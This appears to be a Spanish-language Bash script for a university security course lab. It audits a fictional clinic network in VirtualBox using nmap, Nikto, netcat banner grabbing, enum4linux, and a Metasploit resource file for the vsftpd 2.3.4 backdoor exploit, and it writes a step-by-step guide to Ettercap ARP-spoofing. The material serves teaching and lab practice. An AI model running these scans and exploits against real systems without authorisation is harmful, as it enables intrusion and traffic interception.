#!/usr/bin/env bash
# ==============================================================================
# PROYECTO FINAL SEGURIDAD INFORMATICA - CLINICA LIMATAMBO
# Script Maestro de Auditoria y Pruebas Ofensivas (Semanas 3, 4, 5, 7 y 8)
# Ejecutar desde Kali Linux
# ==============================================================================
# Parametros editables segun las IPs actuales de tu laboratorio VirtualBox:
IP_PORTAL_DMZ="${1:-172.16.10.10}"       # Ubuntu Server + Nginx (Portal Clinica)
IP_LEGACY_METASPLOITABLE="${2:-10.0.0.20}" # Metasploitable2 (Servidor HCE/PACS legado)
IP_GATEWAY="${3:-10.0.0.1}"              # Gateway LAN / OPNsense
RED_OBJETIVO="${4:-10.0.0.0/24}"         # Red a descubrir con netdiscover
INTERFAZ="${5:-eth0}"                    # Interfaz de red en Kali Linux

OUTDIR="Evidencias_Clinica_Limatambo_$(date +%Y%m%d_%H%M)"
mkdir -p "$OUTDIR"

echo "=============================================================================="
echo " INICIANDO AUDITORIA TECNICA PTES / OSSTMM - CLINICA LIMATAMBO"
echo " Carpeta de evidencias: $OUTDIR"
echo "=============================================================================="

# ------------------------------------------------------------------------------
# SEMANA 3: Reconocimiento Activo y Descubrimiento de Red (Lab S3 Kali Linux)
# ------------------------------------------------------------------------------
echo -e "\n[+] [SEMANA 3] 1. Configuracion de red del auditor e inventario de hosts..."
ip a | tee "$OUTDIR/S3_01_ip_auditor.txt"

echo -e "\n[+] [SEMANA 3] 2. Escaneo de servicios y sistema operativo con Nmap (-sV -O)..."
sudo nmap -sV -O "$IP_LEGACY_METASPLOITABLE" | tee "$OUTDIR/S3_02_nmap_sV_O_legacy.txt"

# Nota para captura manual de netdiscover (interactivo o modo pasivo/rango):
echo "sudo netdiscover -i $INTERFAZ -r $RED_OBJETIVO -P" > "$OUTDIR/S3_03_comando_netdiscover.txt"
sudo netdiscover -i "$INTERFAZ" -r "$RED_OBJETIVO" -P | tee -a "$OUTDIR/S3_03_comando_netdiscover.txt" || true

# ------------------------------------------------------------------------------
# SEMANA 4: Fingerprinting Web y Deteccion de Vulnerabilidades (Lab S4)
# ------------------------------------------------------------------------------
echo -e "\n[+] [SEMANA 4] 3. Fingerprinting de tecnologias web con WhatWeb..."
whatweb -v "http://$IP_PORTAL_DMZ" | tee "$OUTDIR/S4_01_whatweb_portal_dmz.txt" || true
whatweb -v "http://$IP_LEGACY_METASPLOITABLE" | tee "$OUTDIR/S4_02_whatweb_legacy.txt" || true

echo -e "\n[+] [SEMANA 4] 4. Escaneo de vulnerabilidades web con Nikto..."
nikto -h "http://$IP_PORTAL_DMZ" -maxtime 60s | tee "$OUTDIR/S4_03_nikto_portal_dmz.txt" || true

# ------------------------------------------------------------------------------
# SEMANA 5: Escaneo SYN Stealth, Banner Grabbing (Netcat) y Enumeracion SMB
# ------------------------------------------------------------------------------
echo -e "\n[+] [SEMANA 5] 5. Escaneo SYN Stealth de puertos criticos (21,22,80,139,445)..."
sudo nmap -sS -sV -O -T4 -p 21,22,80,139,445 "$IP_LEGACY_METASPLOITABLE" | tee "$OUTDIR/S5_01_nmap_stealth_legacy.txt"

echo -e "\n[+] [SEMANA 5] 6. Banner Grabbing con Netcat (Puertos 21 FTP, 22 SSH, 80 HTTP)..."
{
    echo "=== BANNER PORT 21 (FTP) ==="
    echo "QUIT" | nc -v -w 3 "$IP_LEGACY_METASPLOITABLE" 21 2>&1 || true
    echo -e "\n=== BANNER PORT 22 (SSH) ==="
    echo "" | nc -v -w 3 "$IP_LEGACY_METASPLOITABLE" 22 2>&1 || true
    echo -e "\n=== BANNER PORT 80 (HTTP HEAD) ==="
    printf "HEAD / HTTP/1.0\r\n\r\n" | nc -v -w 3 "$IP_LEGACY_METASPLOITABLE" 80 2>&1 || true
} | tee "$OUTDIR/S5_02_banner_grabbing_netcat.txt"

echo -e "\n[+] [SEMANA 5] 7. Enumeracion SMB/Samba con Enum4linux sobre Servidor Legado..."
enum4linux -a "$IP_LEGACY_METASPLOITABLE" | tee "$OUTDIR/S5_03_enum4linux_legacy.txt" || true

# ------------------------------------------------------------------------------
# SEMANA 7: Explotacion Controlada con Metasploit Framework (vsftpd 2.3.4)
# ------------------------------------------------------------------------------
echo -e "\n[+] [SEMANA 7] 8. Generando script automatizado de Metasploit (vsftpd_234_backdoor)..."
cat << EOF > "$OUTDIR/S7_metasploit_vsftpd.rc"
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $IP_LEGACY_METASPLOITABLE
set RPORT 21
show options
exploit
EOF

echo "Para ejecutar el laboratorio de la Semana 7 y tomar la captura de root, corre:"
echo "  sudo msfconsole -r $OUTDIR/S7_metasploit_vsftpd.rc"
echo "Y dentro de la sesion abierta escribe: id ; uname -a ; hostname ; pwd"

# ------------------------------------------------------------------------------
# SEMANA 8: Ataque MITM / ARP Spoofing con Ettercap (Escenario AS-IS Red Plana)
# ------------------------------------------------------------------------------
cat << EOF > "$OUTDIR/S8_guia_comandos_MITM_Ettercap.txt"
================================================================================
SEMANA 8: COMANDOS EXACTOS PARA LAS CAPTURAS DEL LABORATORIO MITM (ETTERCAP)
================================================================================
1. En la VM Victima (antes del ataque), verificar tabla ARP limpia:
   ip neigh

2. En Kali Linux, descubrir hosts en capa 2 con arp-scan:
   sudo arp-scan --interface=$INTERFAZ --localnet

3. En Kali Linux, habilitar el reenvio de paquetes IPv4 (IP Forwarding):
   sudo sysctl -w net.ipv4.ip_forward=1

4. En Kali Linux, lanzar el envenenamiento ARP con Ettercap (modo texto o grafico):
   Modo Texto:
     sudo ettercap -T -M arp:remote /$IP_LEGACY_METASPLOITABLE// /$IP_GATEWAY//
   Modo Grafico:
     sudo ettercap -G

5. En otra terminal de Kali Linux, capturar los paquetes ARP falsificados:
   sudo tcpdump -ni $INTERFAZ arp -c 15

6. En la VM Victima (durante el ataque), volver a ejecutar:
   ip neigh
   (Capturar como la IP del Gateway y la IP de Kali ahora tienen la MISMA direccion MAC)

7. Al finalizar, restaurar el entorno (presionar 'q' en Ettercap) y desactivar forwarding:
   sudo sysctl -w net.ipv4.ip_forward=0
================================================================================
EOF

echo -e "\n[OK] Auditoria finalizada. Todos los resultados estan en: $OUTDIR"
